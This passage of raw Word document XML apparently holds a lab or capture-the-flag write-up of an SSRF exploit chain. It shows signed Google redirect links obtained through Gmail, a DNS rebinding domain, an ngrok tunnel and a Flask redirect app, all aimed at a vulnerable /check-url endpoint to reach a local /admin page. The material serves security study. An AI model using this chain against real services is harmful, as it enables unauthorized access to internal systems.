      </w:r>
      <w:r>
        <w:t xml:space="preserve">act the complete Google redirect URL with a valid </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>usg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> parameter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B26AC3D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>This works because Gmail automatically converts plain URLs in emails into Google redirect links with valid signatures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75AA91F9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>3. DNS Rebinding Research</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAEFA4A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>The application has protection against DNS rebi</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nding, but it only checks the IP twice with a 1-second interval. We found a service at </w:t>
      </w:r>
      <w:hyperlink r:id="rId12">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>lock.cmpxchg8b.com/rebinder.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> that facilitates DNS rebinding attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C4B408" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>This service provides domains that r</w:t>
      </w:r>
      <w:r>
        <w:t>andomly alternate between two IP addresses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3B9E39" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>A public IP address of your choice (to pass security checks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D31F2B6" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>127.0.0.1 (to achieve our SSRF goal)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7038E949" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">Important note: Because the service alternates randomly between IPs, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>this attack may require several attempts to s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ucceed</w:t>
      </w:r>
      <w:r>
        <w:t>. The timing needs to be just right:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525A8610" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>During the two security checks, the domain must resolve to the public IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D5E70E" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>When the final request is made, the domain must resolve to 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0DFCB9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>Image placeholder: Screenshot of DNS rebinding service configuration]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A509C3" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577485C2" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Setting Up HTTP Tunneling with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2C3C5080" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>First, we need to create an HTTP tunnel to our local server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E8FCFE" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># In another terminal, start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> http 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253E627C" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">This gives us a public URL like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://f82e-196-153-112-10.ngrok-free.app</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6554EA17" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>2. Creating Our Redirect Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A5534B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>We create a simple Flask application that will redirect to our DNS rebinding domain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32791D0B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>from flask import Flask, redirect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>app = Flask(__name__)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>@</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>app.route</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('/')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>def index():</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Redirect to DNS rebinding domain that will eventually resolve to 127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    return redirect('http://7f000001.037dd15e.rbndr.us/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>admin?nickname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=x'), 302</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5BFCB2" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"># the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> that will be redirected to will later be explained.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>if __name__ == '__main__':</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>p.run</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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host='0.0.0.0', port=8080)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FA205D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>This application simply redirects any requests to a specially crafted DNS rebinding domain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10B8789D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>3. DNS Rebinding Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF7D6EF" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">For the DNS rebinding attack, we use </w:t>
      </w:r>
      <w:hyperlink r:id="rId13">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>lock.cmpxch</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>g8b.com/rebinder.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> to create a domain that randomly alternates between:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FD55A2" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>A public IP address (8.8.8.8 or another non-private IP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECAF447" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>127.0.0.1 (localhost)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0A2C20" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>The configuration is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404B836B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>"Hostname A" field: 127.0.0.1 (represented as 7f000001 in hexadecimal)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFD77C3" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">"Hostname </w:t>
      </w:r>
      <w:r>
        <w:t>B" field: A public IP (like 8.8.8.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E85027" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click "Get rebinding link"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C57B99E" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73A4F461" wp14:editId="1A4034F0">
            <wp:extent cx="5943600" cy="146113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1461135"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t>The resulting domain (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>7f000001.037dd15b.rbndr.us</w:t>
      </w:r>
      <w:r>
        <w:t>) will:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C78A6E2" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Sometimes resolve to the public IP (passing security checks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA706B0" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Sometimes resolve to 127.0.0.1 (achieving our SSRF goal)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B87EEE" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Since the alterna</w:t>
      </w:r>
      <w:r>
        <w:t>tion is random, we may need several attempts to get lucky with the timing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEA4701" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4. Getting a Valid Google Redirect URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB2C357" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>We use the Gmail method to obtain a valid Google redirect:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FC8924" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Send an email containing our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> URL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E260E30" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://f82e-196-153-112-10.ngrok-free.app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FAEE53" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Open the email in another Gmail account and inspect the link</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0995CA69" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Capture the full Google redirect URL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5282D2F8" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>https://www.google.com/url?q=https://f82e-196-153-112-10.ngrok-free.app&amp;source=gmail&amp;ust=1749640028092000&amp;usg=AOvVaw3SumcNqTsz0hJeDYCm4Uei</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE4501A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>5. Executing the Full Attack Chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E1F7BE" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Now we can execute our full attack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEA2F6F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Send our Google redirect URL to the vulnerable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> application:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022A6F19" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>POST /check-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>{"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
